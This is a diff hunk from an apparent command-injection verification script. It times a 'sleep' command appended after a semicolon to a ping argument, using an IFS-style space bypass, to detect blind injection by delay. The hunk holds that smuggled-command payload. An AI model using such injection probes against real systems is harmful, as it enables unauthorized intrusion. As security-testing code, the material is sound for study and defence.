@@ -25,7 +25,7 @@ def verify(inj, sleep_seconds: int = 10, log=print) -> dict:
         elapsed, _ = run_ping(client, ":::::::;" + cmd)
         return elapsed
 
-    t_sleep = timed(f"sleep${{IFS}}{sleep_seconds}".replace("${IFS}", I))
+    t_sleep = timed(f"sleep{I}{sleep_seconds}")
     log(f"[verify] timing-sleep {t_sleep:.1f}s")
     report["timing_sleep_s"] = round(t_sleep, 2)
     timing_injection = t_sleep > baseline + TIMING_THRESHOLD
